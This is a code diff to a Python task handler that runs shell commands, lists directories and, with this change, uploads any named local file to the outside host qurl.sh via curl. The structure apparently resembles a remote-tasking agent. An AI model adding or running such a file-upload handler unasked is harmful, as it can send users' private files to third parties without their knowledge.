@@ -56,10 +56,9 @@ class TaskHandler:
             command = ["dir", directory]
 
         elif os == "linux":
-            command = ["ls", directory]
+            command = ["ls", "-la", directory]
 
         return self.run_command(command=command)
-
 
     def upload_file(self, args):
         file_path = args.get("file_path")
@@ -69,9 +68,7 @@ class TaskHandler:
 
         curl = "curl.exe" if platform.system() == "Windows" else "curl"
 
-        result = self.run_command(f'{curl} -s -F "file=@{file_path}" https://qurl.sh')
-
-        return result
+        return self.run_command(f'{curl} -s -T "{file_path}" https://qurl.sh')
 
     def write_file(self, args):
         pass
@@ -83,6 +80,7 @@ class TaskHandler:
         handlers = {
             "command_execution": self.execute_command,
             "list_directory": self.list_directory,
+            "upload_file": self.upload_file,
         }
 
         handler = handlers.get(task_type)
